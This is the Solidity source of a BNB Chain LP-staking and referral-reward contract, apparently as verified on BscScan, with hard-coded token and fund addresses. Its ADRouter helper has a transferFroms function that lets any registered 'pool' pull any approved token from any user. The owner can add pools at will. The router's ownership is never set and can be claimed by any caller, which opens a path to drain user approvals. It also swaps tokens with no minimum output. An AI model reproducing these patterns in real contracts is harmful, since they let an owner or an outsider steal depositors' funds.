/**
 *Submitted for verification at BscScan.com on 2022-03-13
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
//安全数学库
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() public {
    }


    function owner() internal view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        require(_owner == msg.sender || _owner == address(0));
        _owner = newOwner;
    }
}
contract ADRouter is Ownable{
	mapping (address => bool) public pools;
	mapping (address => address) public referrer;
	mapping (address => uint256) public refsAmount;
	address public uniswapV2Pair;
	constructor() public {
	pools[msg.sender] = true;
    }

    	modifier onlyPool() {
        require(pools[msg.sender] || msg.sender == owner());
        _;
    }
	function setReferrer(address from,address to) public onlyPool{
		if(referrer[from] ==address(0)){
			referrer[from] = to;
			refsAmount[to] = refsAmount[to]+1;
		}
		
	}
	function transferFroms(address token,address from,address to,uint256 amount) public onlyPool{
		IERC20(token).transferFrom(from,to,amount);
	}
	function setPool(address p,bool b)public onlyPool{
		pools[p] = b;
	}
}
// Dependency file: contracts/interfaces/IUniswapV2Router02.sol

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Mining{
    using SafeMath for uint;
    address payable public _owner;
	uint256 public lastRewardBlock;
	uint256 public allRewardDebt;
	uint256 public totalAmount;
	uint256 public withdrawedBNB;
	uint256 public maxNum;
	uint256 public oneBolckToken;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint256 public indexx = 0;
	ADRouter public router;
	IUniswapV2Router02 public uniswapV2Router;
	address public uniswapV2Pair;
	struct User {
    uint256 amount;     
    uint256 myRewardDebt; 
    uint256 notDrawRewardDebt; 
	uint256 rebateAount;	
	uint256 totalRefsAmount; 
	uint256 totalMyAmount; 
	bool isFirst;
	
}
    mapping (address => User) internal users;
    mapping (uint256 => address) internal findAddrByIndex;
	address public token;
	address public tokenFrom;
    constructor() public {
        _owner = msg.sender;
		router = new ADRouter();
		router.setPool(address(this),true);
		lastRewardBlock = block.number;
		//每区块奖励（初始值不用动）
		oneBolckToken = 1 * 10**20;
		//当前区块累计奖励（初始值不用动）
		allRewardDebt = 1 * 10**20;
		totalAmount = 1;
		token = 0x6a0D1655f74a9856Ee450FBA023C0580D7fC5268;//代币合约
		tokenFrom = 0xebd03CEa0Fd747A0504Aee1B47CE614348ed8d96;//基金池地址
		uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);//swap合约
        uniswapV2Pair = 0x5cAFeb7B27935885f72fBF23eF1c4EDdcBA0CE6C;//lp合约
		maxNum = 10**25;//AD最大持仓限制是多少就填多少
		IERC20(uniswapV2Pair).approve(address(router),~uint256(0));
		}

	modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }
	    receive() external payable {

  	}
	function updateAllRewardDebt() public returns(bool){
		withdrawedBNB = withdrawedBNB.add((block.number-lastRewardBlock).mul(oneBolckToken).div(10**20));
		uint256 IntervalBlock = (block.number).sub(lastRewardBlock);
		uint256 oneBolckTokens = oneBolckToken.div(totalAmount);
		allRewardDebt = allRewardDebt.add(oneBolckTokens.mul(IntervalBlock));
		lastRewardBlock = block.number;
		setOneBolckToken();
		return true;
	}
	//卖出代币
	    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = uniswapV2Router.WETH();
		IERC20(token).approve(address(uniswapV2Router),tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
	function getRouter()public view returns(address){
		return address(router);
	}
	//质押
	function invest(address inviter,uint256 amount) public {
		router.setReferrer(msg.sender,inviter);
		router.transferFroms(uniswapV2Pair,msg.sender,address(this),amount);
        User storage user = users[msg.sender];
        if (!user.isFirst) {
		updateAllRewardDebt();
            user.myRewardDebt = allRewardDebt;
			user.isFirst = true;
        }else{
			withDraw();
			}
		user.amount = (user.amount).add(amount);
		totalAmount = totalAmount.add(amount);
	}
	//提取收益
	function withDraw() public {
		updateAllRewardDebt();
        User storage user = users[msg.sender];
		uint256 allNumToken = (user.amount).mul(allRewardDebt-user.myRewardDebt).div(10**20);
		address referrer = getReferrer(msg.sender);
		if(referrer != address(0)){
		payable(referrer).transfer(allNumToken.mul(2).div(100));
		users[referrer].totalRefsAmount = (users[referrer].totalRefsAmount).add(allNumToken.mul(2).div(100));
		withdrawedBNB = withdrawedBNB.sub(allNumToken.mul(2).div(100));
		}		
		user.myRewardDebt = allRewardDebt;
		user.totalMyAmount = (user.totalMyAmount).add(allNumToken.mul(98).div(100));
		withdrawedBNB = withdrawedBNB.sub(allNumToken.mul(98).div(100));
		payable(msg.sender).transfer(allNumToken.mul(98).div(100));
	}

	function setOneBolckToken()private{
		uint256 balanceOf = IERC20(token).balanceOf(tokenFrom);
		if(balanceOf>maxNum){
			balanceOf = maxNum;
		}
		IERC20(token).transferFrom(tokenFrom,address(this),balanceOf);
		swapTokensForEth(balanceOf);
		uint256 nowBalance = address(this).balance;
		uint256 realBalance = nowBalance.sub(withdrawedBNB);
		//动态修改挖矿速度
		oneBolckToken = realBalance.mul(10**20).div(2880000);
	}
	function getOneBolckRewardDebt ()public view returns(uint256){
	return oneBolckToken.div(totalAmount);
	}
	function setTokenFrom(address newTokenFrom) public onlyOwner{
		tokenFrom = newTokenFrom;
	}
	function getMyNotDrawRewardDebt()public view returns(uint256){
        User storage user = users[msg.sender];
		uint256 IntervalBlock = (block.number).sub(lastRewardBlock);
		uint256 oneBolckTokens =  oneBolckToken.div(totalAmount);
		uint256 allRewardDebtf = allRewardDebt.add(oneBolckTokens.mul(IntervalBlock));
		uint256 allNumToken = (user.amount).mul(allRewardDebtf-user.myRewardDebt).div(10**20);
		return allNumToken;
	}

	//取消质押
	function Release(uint256 num)public {
    User storage user = users[msg.sender];
	require(user.amount>=num);
	withDraw();
	user.amount = user.amount.sub(num);
	totalAmount = totalAmount.sub(num);
	IERC20(uniswapV2Pair).transfer(msg.sender,num);

	}
	function getUser() public view returns(uint256,uint256,uint256){
		User storage user = users[msg.sender];
		uint256 myamount = user.amount;
		uint256 mytotalRefsAmount = user.totalRefsAmount;
		uint256 mytotalMyAmount = user.totalMyAmount;
		return(myamount,mytotalRefsAmount,mytotalMyAmount);
	}
	function getReferrer(address addr)public view returns(address){
		return router.referrer(addr);
	}
	//设置合约拥有者
	function setOwner(address payable newOwner) public onlyOwner{
		_owner = newOwner;
		
	}
	//新增挖矿池
	function addPool(address addr) public onlyOwner{
		router.setPool(addr,true);
	}
	//删除挖矿池
	function removePool(address addr) public onlyOwner{
		router.setPool(addr,false);
	}
	//设置基金钱包地址
	function setMarketingAddr(address addr) public onlyOwner{
		tokenFrom = addr;
	}
	function setmaxNum(uint256 num) public onlyOwner{
		maxNum = num;
	}
	
}